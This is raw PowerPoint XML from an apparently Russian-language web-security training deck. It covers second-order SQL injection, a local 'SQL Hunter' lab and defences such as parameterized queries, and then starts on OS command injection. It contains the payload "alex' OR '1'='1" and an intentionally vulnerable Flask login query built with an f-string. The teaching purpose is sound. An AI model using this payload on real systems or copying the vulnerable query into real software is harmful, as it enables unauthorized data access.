      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="188316183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79786B1C-94F2-4753-96F3-D175F66EB060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lang="en-US" dirty="0"/>
              <a:t>Second-order SQL injection</a:t>
            </a:r>
            <a:endParaRPr sz="3300" b="1" dirty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BDE16F2-BBFB-42B0-8582-7608FF617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14" name="v7-text-244">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28F77413-683E-46ED-A6F7-5131A6739A68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506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Сначала сохранена строка</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v7-text-245">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4910CA84-1C78-4690-AE4B-1EFECB40C449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50673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{"id": </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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17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"name":</a:t>
            </a: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"alex' OR '1'='1"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1725" b="0">
              <a:solidFill>
                <a:srgbClr val="EEF2F6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Запись через bind-параметр</a:t>
            </a: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сохраняет именно текст</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v7-text-246">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26691926-132E-44EB-BF4D-63697966CCA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5114925"/>
            <a:ext cx="506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Само сохранение код не выполняет</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v7-text-247">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33D7C455-EB89-4282-BE4E-196704A4813E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2000250"/>
            <a:ext cx="506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Позже собран другой SQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v7-text-248">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24484A94-6A39-4B4A-BD5A-DE80DBF51309}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2800350"/>
            <a:ext cx="50673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id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users</a:t>
            </a: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username = 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'alex'</a:t>
            </a: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OR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'1'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'1'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9" name="v7-text-249">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45D89A40-1C0C-415E-B7B8-1CF9557C773A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="5114925"/>
            <a:ext cx="506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Условие выбирает все строки users</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="157454033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7F3E07F-3FD8-4039-8727-161454B8BF84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SQL Hunter: задание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Рисунок 13" descr="Скриншот выполнения из writeup_for_web.pptx, объединённый с карточкой задания.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EC1FCFE-B7AD-4FF9-AEDC-E4F759095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266825" y="2462873"/>
            <a:ext cx="6000750" cy="2875229"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0651A264-0F84-4FE3-819A-1062E6CF93E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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5000"/>
              </a:lnSpc>
              <a:buNone/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Проверить доступ к чужим notes через обработку входа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40D97A13-B1DF-4E57-8A09-C5D2DBD86861}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B975B4F-2C1C-4A15-B7CD-27273D151B3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C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9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8084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260CE45-910F-4A49-9AEA-39B399F40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38823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706144-546F-9B2C-04EC-E325DA5C0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326B1E3C-5949-5C6A-69E0-449CACDBFDC3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SQL Hunter: анализ кода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AF7EF89-7B47-88E7-A5EC-9A480603F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3" name="editable-code-73-3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D12A94D5-4E20-4FCF-8F41-3701F61D6038}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1383030"/>
            <a:ext cx="10820400" cy="4846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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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@app.route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'/login'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45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methods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4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'GET'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'POST'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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00000"/>
              </a:lnSpc>
              <a:buNone/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45" b="0">
                <a:solidFill>
                  <a:srgbClr val="F4474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login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()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00000"/>
              </a:lnSpc>
              <a:buNone/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"username"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session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and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"user_id"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session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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redirect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url_for</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'notes'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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request.method == 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'GET'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00000"/>
              </a:lnSpc>
              <a:buNone/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render_template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'auth.html'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45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mode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'login'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45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error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=request.args.get</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'error'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45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24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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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'username'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request.form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or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'password'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request.form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or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request.form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'username'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or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request.form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'password'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00000"/>
              </a:lnSpc>
              <a:buNone/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redirect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url_for</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'login'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45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error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'No credentials provided'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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username = request.form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'username'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ct val="100000"/>
              </a:lnSpc>
              <a:buNone/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password = hashlib.sha256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request.form</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'password'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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.encode</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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()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.hexdigest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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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00000"/>
              </a:lnSpc>
              <a:buNone/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result = execute_db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f"SELECT * FROM users WHERE username = '</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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username</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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 AND password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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password</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'"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.fetchone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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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result:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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redirect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url_for</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'login'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45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error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'Invalid credentials'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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session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"user_id"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= result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4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ct val="100000"/>
              </a:lnSpc>
              <a:buNone/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session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'username'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= result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4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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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redirect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url_for</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'notes'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1245" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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buNone/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SQLAlchemyError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e:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="124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24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redirect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url_for</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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'login'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45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error</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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4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'Database error'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="124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4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9505487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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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SQL Hunter: шаг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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-19-8" descr="SQL Injection, шаг 4. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51F3EB58-DA64-51DE-07C0-C52916624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562" y="1581150"/>
            <a:ext cx="9520876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94980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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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SQL Hunter: шаг 2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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-20-8" descr="SQL Injection, шаг 5. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{176DAAF1-F8AB-89A1-868A-199A50433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325" y="1581150"/>
            <a:ext cx="953135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94980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9DAF0FC9-D0A0-4D47-84E5-8517A7C351D9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SQL Hunter: защита от SQLi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69A8949-B99E-43B1-8733-8538A7D38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3" name="v17-text-57">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{82A34B03-86C9-45D9-914A-C6AB81D4E3E9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5067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8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Как не надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-58">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F73EBAC4-34C0-483B-AB2D-2377C5F124F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8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Как надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2594D62F-6812-48FE-A178-32FC19017DD1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50673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username = request.form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"username"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q = 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"SELECT * FROM users "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f"WHERE username='</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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username</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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'"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row = conn.execute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65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q</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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.first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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1650" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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text(q) не убирает инъекцию</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v17-text-60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{975AD120-529F-485F-B502-D2D6E6A2218F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2476500"/>
            <a:ext cx="50673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stmt = text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"SELECT id, password FROM users "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"WHERE username = :name"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row = conn.execute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stmt,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"name"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 username</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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.mappings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()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.first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row </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="16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None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or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check_password_hash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row</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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"password"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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password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abort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401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7" name="v17-text-61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A787F286-0ABF-4773-864D-E2049A328E0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5324475"/>
            <a:ext cx="10287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203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Параметризовать каждый SELECT / INSERT / UPDATE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Пароли хранить с солью: scrypt или Argon2id.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Ограничить права учётной записи приложения в БД.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5638048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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7FBC550-8FC3-4321-8431-14A034E7057A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Команды ОС: обработка файла на сервере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70441F40-0EA5-41B0-AAE6-CB46A0DE0BB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Приложение делает миниатюру загруженного изображения с помощью внешней утилиты.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-browser">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{140EBD0A-D1A6-40A5-9743-E4237D01681B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2857500" cy="257175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8D9B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browser-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20C58D82-0131-4DC3-B627-F9F3DD4622EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="342900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Браузер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="browser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FF8C7FDC-890A-4377-ADED-B441B8A16304}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3914775"/>
            <a:ext cx="2552700" cy="1171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Загружает фото</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Получает миниатюру</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-app">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F7EB681-FD8A-4D5D-8B58-975B163A8B0E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2609850"/>
            <a:ext cx="2857500" cy="257175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8D9B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app-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06ECFAE5-3EE8-48CF-83C4-93EDD8C9A39A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781550" y="342900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Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="app-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4CA4CF9E-74BB-439F-953E-F68E91771730}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819650" y="3914775"/>
            <a:ext cx="2552700" cy="1171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Принимает файл</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Задаёт размер</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Запускает утилиту</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-process">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C7D72B9-9C61-4084-9BC5-CD6CF298C6F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="2609850"/>
            <a:ext cx="2857500" cy="257175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8D9B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process-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A40390C2-9EA6-44DA-80F7-348DF2031EDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8763000" y="342900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Процесс ОС</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="process-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C40924D-8121-446A-84E8-03504F01FDD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8801100" y="3914775"/>
            <a:ext cx="2552700" cy="1171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ImageMagick</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Создаёт thumb.png</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Возвращает код выхода</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="flow-upload">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9BF49B1-BD19-4AE0-BE28-F4D25E107F4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3409950"/>
            <a:ext cx="1123950" cy="0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3" name="flow-label-upload">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{998BA3D3-9C8A-41E3-9882-D271ACA8294D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="2981325"/>
            <a:ext cx="1009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Файл</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-start">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E8CA292-0721-4367-8DC9-06CA37833350}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="3409950"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-start">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA863B24-B596-41F3-B44E-0DB24762262A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="2981325"/>
            <a:ext cx="1009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Запуск</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-output">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6EE8B6DB-9E5C-40C3-9459-5429765C76E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4476750"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="flow-label-output">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80F84A3F-5933-4F49-A012-18261F2C7CAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="4581525"/>
            <a:ext cx="1009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Файл /</a:t>
            </a:r>
          </a:p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статус</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="flow-preview">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4793605C-503B-486E-86ED-DBA0E5DFB393}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
